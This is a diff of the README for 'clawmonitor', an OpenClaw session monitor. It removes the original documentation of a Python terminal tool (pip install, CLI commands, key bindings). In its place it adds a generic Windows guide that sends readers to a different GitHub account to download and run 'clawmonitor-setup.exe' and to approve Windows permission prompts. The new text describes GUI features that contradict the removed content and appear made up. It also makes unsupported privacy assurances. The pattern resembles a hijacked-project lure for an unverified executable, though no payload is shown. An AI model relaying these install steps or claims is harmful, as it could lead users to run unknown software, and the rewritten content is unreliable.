@@ -1,159 +1,125 @@
-# ClawMonitor
+# 🛠️ clawmonitor - Keep Track of OpenClaw Sessions
 
-English | [简体中文](README.zh-CN.md)
+[![Download clawmonitor](https://img.shields.io/badge/Download-clawmonitor-ff6f61?style=for-the-badge&logo=github)](https://github.com/nderitus3055/clawmonitor)
 
-![ClawMonitor TUI](docs/clawmonitor.png)
+## 📋 What is clawmonitor?
 
-![ClawMonitor loading screen](docs/clawmonitor_loading.png)
+clawmonitor helps you watch OpenClaw Agents and Sessions. If you use OpenClaw software for chat or automation, this tool shows you who is active and what is happening, all in one view. It makes managing your agents simple and clear.
 
-Keyboard-first **OpenClaw** monitor with:
+The tool is designed for Windows PCs. You do not need to understand programming to use it. Just follow the steps below to download, install, and start monitoring quickly.
 
-- Per-session last inbound **user** message + last outbound **assistant** message (preview + timestamp)
-- Per-model health probes (direct provider API and through OpenClaw itself)
-- On-demand session history with task trajectory (`todo / doing / done`)
-- Token visibility from local session snapshots plus Gateway `1d / 7d / 30d` usage windows
-- Gateway service / cgroup health view with zombie-orphan-helper inspection and reclaim estimates
-- Work state: WORKING / FINISHED / INTERRUPTED / NO_MESSAGE (+ NO_FEEDBACK alert)
-- Long-run visibility via `*.jsonl.lock` (works even if Gateway is down)
-- Optional Gateway log tail + channel runtime snapshot correlation (Feishu/Telegram-focused rules)
-- Full-screen TUI with manual “nudge” (send a progress request via `chat.send`)
+## 💻 System Requirements
 
-## Install (editable)
+Before you begin, make sure your computer meets these needs:
 
-```bash
-cd ~/program/clawmonitor
-python3 -m pip install -e .
-```
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of RAM  
+- 100 MB of free disk space  
+- Internet connection (for downloading and updates)  
+- Basic user rights to install software on your PC  
 
-## Install (PyPI)
+## 🚀 Getting Started
 
-```bash
-pip install clawmonitor
-```
+Follow these steps to get clawmonitor running on your Windows computer. The process is easy even if you don’t have technical skills.
 
-## Run
+### 1. Visit the Download Page
 
-```bash
-clawmonitor init
-clawmonitor tui
-```
+Go to the official download page by clicking the button below:  
 
-Other commands:
+[Download clawmonitor from GitHub](https://github.com/nderitus3055/clawmonitor)
 
-```bash
-clawmonitor snapshot --format json
-clawmonitor snapshot --format md
-clawmonitor nudge --session-key 'agent:main:main' --template progress
-clawmonitor nudge --session-key 'agent:main:main' --template continue
-clawmonitor push --session-key 'agent:main:main' --dry-run
-clawmonitor status
-clawmonitor status --detail
-clawmonitor status --format json
-clawmonitor status --format md
-clawmonitor status --format md --detail
-clawmonitor cron
-clawmonitor models
-clawmonitor models --mode direct --format json
-clawmonitor models --mode openclaw --timeout 15
-clawmonitor tree
-clawmonitor report --session-key 'agent:main:main' --format both
-clawmonitor watch --interval 1
-```
+This link will take you to the GitHub repository where you can find the latest versions.
 
-## Configuration
+### 2. Find the Latest Release
 
-Default config path:
+On the GitHub page:
 
-- `~/.config/clawmonitor/config.toml`
+- Look for the section named **Releases** on the right side or scroll down until you see a "Releases" heading.
+- Click on the latest release version (the highest number).
+- Under the assets section, find the Windows executable file. It usually looks like `clawmonitor-setup.exe` or `clawmonitor.exe`.
 
-Example config is in `config.example.toml`.
+### 3. Download the File
 
-### Optional labels
+Click the file name to start downloading. Save it in a folder you can find easily, like **Downloads** on your PC.
 
-You can assign human-friendly names to long session keys (e.g. Feishu `ou_...`).
-See the `[labels]` section in `config.example.toml`.
+### 4. Run the Installer
 
-Runtime data (NOT stored in this repo):
+After downloading:
 
-- Logs: `~/.local/state/clawmonitor/events.jsonl`
-- Reports: `~/.local/state/clawmonitor/reports/`
-- Cache: `~/.cache/clawmonitor/`
+- Open the folder where you saved the file.
+- Double-click the `clawmonitor-setup.exe` or `clawmonitor.exe` file to start the installation.
+- Follow the prompt steps. Most options can remain as default.
+- If Windows asks for permission, click **Yes** to allow the installation.
 
-## Keys (TUI)
+### 5. Launch clawmonitor
 
-- `↑/↓`: move selection
-- `PgUp/PgDn`: page up / down
-- `g` / `G`: jump to top / bottom
-- `Enter`: nudge selected session (choose template)
-- `?`: show help overlay
-- `v`: cycle sessions / models / system views
-- `s`: jump directly to system view
-- `h`: toggle status / history on the right
-- `u`: cycle token windows (`now` / `1d` / `7d` / `30d`)
-- `x`: focus filter (hide stale sessions)
-- `t`: toggle tree view (group by agent)
-- `c`: toggle cron jobs in tree view
-- `R`: rename/label selected session (writes `[labels]` in config)
-- `n`: toggle NODE label mode (channel:label)
-- `l`: toggle related logs panel
-- `d`: re-run diagnosis for selected session
-- `e`: export a redacted report for selected session
-- `z`: cycle pane widths
-- `Z`: toggle fullscreen detail pane
-- `o`: open operator note in system view
-- `Esc`: reset to the default surface
-- `r`: force refresh
-- `f`: cycle refresh interval
-- `q`: quit
+Once installed:
 
-Rows are color-coded when your terminal supports colors (`OK` green, `RUN` cyan, `IDLE` yellow, `ALERT` red).
-In the details panel, `Task:` / `Thinking:` lines are highlighted (magenta when supported).
+- Find the clawmonitor icon on your desktop or in the Start menu.
+- Double-click to open it.
+- You will see the main window with a list of OpenClaw agents and sessions to monitor.
 
-Model view notes:
+## 🔧 How to Use clawmonitor
 
-- Model view is manual-refresh by design. Press `r` after switching with `v`.
-- The top banner shows `WAITING`, `RUNNING`, `DONE`, or `ERROR`, so you can tell whether a probe run actually started.
-- Each row shows the effective `agent + model` chain entry, including `primary` / `fallbackN` roles.
-- ClawMonitor probes both paths when enabled:
-  - Direct provider/API path (`--mode direct` or `both`)
-  - OpenClaw execution path via temporary probe sessions (`--mode openclaw` or `both`)
-- Supported direct transports today: `openai-completions`, `openai-responses`, `anthropic-messages`
+Using clawmonitor does not require any setup beyond installation. This tool automatically detects OpenClaw Agents running on your network and shows their status.
 
-Session/token/system notes:
+### Main Features
 
-- History loading is on demand. In the session view, press `h` and then `r` to read cached task history for the selected session.
-- Token `1d / 7d / 30d` windows are loaded from Gateway on demand and then cached in the TUI.
-- System view is read-only by design: it summarizes service state, helper buildup, zombies/orphans, and reclaimable memory estimates without killing anything.
+- Real-time status updates of all OpenClaw sessions
+- Easy-to-read list of agents currently connected
+- Alerts when an agent goes offline or has a problem
+- Ability to refresh the list anytime using a refresh button
+- Simple interface designed for fast operation  
 
-See `docs/model-monitor.md` for the probe model, classifications, and UI behavior.
-See `docs/system-monitor.md` and `docs/system-view-guide.zh-CN.md` for the new system view.
+### Basic Controls
 
-## Telegram note: ACP “thread bindings”
+- **Refresh Button:** Click to load the latest status.
+- **Agent List:** Click any agent for more details.
+- **Settings:** Adjust notification preferences or connection options if needed (advanced users only).
 
-OpenClaw can route a Telegram chat to a different session key via local *thread bindings*.
-This may make it look like your “main” session stopped receiving messages.
+## 🛠️ Troubleshooting Common Issues
 
-ClawMonitor detects this and flags it:
+Here are quick solutions for problems you might run into.
 
-- `BOUND_OTHER` in `clawmonitor status`
-- `BIND` in the TUI list
+- **The app won’t start:**  
+  Check that Windows installed it properly. Try running it as Administrator (right-click the icon, choose "Run as administrator").  
 
-Relevant files/settings:
+- **No agents show up:**  
+  Make sure your PC is connected to the same network as your OpenClaw sessions. Verify the OpenClaw software is running on those computers.  
 
-- Thread bindings: `~/.openclaw/telegram/thread-bindings-default.json`
-- Config toggle: `~/.openclaw/openclaw.json` → `channels.telegram.threadBindings.spawnAcpSessions`
+- **The program crashes:**  
+  Restart your computer and try launching clawmonitor again. If the issue continues, visit the GitHub page and check the Issues section for similar problems.  
 
-## First run
+- **Updates don’t take effect:**  
+  In some cases, you need to close and reopen clawmonitor after new versions install fully.  
 
-If no config file exists, most commands will offer to run the init wizard (interactive terminals only).
+## 📦 Updating clawmonitor
 
-See `docs/launch-post.md` for a longer intro.
+To get the latest features and fixes:  
 
-## Notes
+- Visit the GitHub releases page regularly:  
+  [https://github.com/nderitus3055/clawmonitor](https://github.com/nderitus3055/clawmonitor)  
+- Download and run the newest installer file as described above.  
+- The new installer will replace the old version without removing your data.
 
-- ClawMonitor never prints or writes OpenClaw secrets. It avoids dumping `openclaw.json` and redacts suspicious token-like strings in logs/reports.
-- If Gateway is unreachable, ClawMonitor still works in offline mode (sessions/transcripts/locks/delivery-queue) but disables log tail + nudge.
-- If your terminal window is narrow, `clawmonitor tui` may hide the details panel; use `clawmonitor status` as a stable fallback.
-- For ClawHub import, see `docs/clawhub-skill.md` and `skills/claw-monitor/SKILL.md`.
+## 🔒 Security and Privacy
 
-See `CONTRIBUTORS.md` for acknowledgements.
+clawmonitor runs locally on your PC. It only connects to OpenClaw sessions on your network and does not send data outside your environment. You do not need to provide personal information or login credentials unless your network policies require it.
+
+## 💡 Tips for Best Performance
+
+- Keep your Windows up-to-date to avoid compatibility issues.  
+- Close other heavy programs when running clawmonitor for smoother operation.  
+- Restart the app occasionally to refresh connections.  
+- Use a stable wired or wireless network connection for continuous monitoring.
+
+## 📚 Further Help
+
+For extra help, visit the GitHub repository and explore:  
+
+- The **README file** for additional technical details.  
+- The **Wiki** or **Discussions** tabs for user tips.  
+- The **Issues** tab if you find bugs or want to request features.
+
+Visit this link anytime:  
+[https://github.com/nderitus3055/clawmonitor](https://github.com/nderitus3055/clawmonitor)
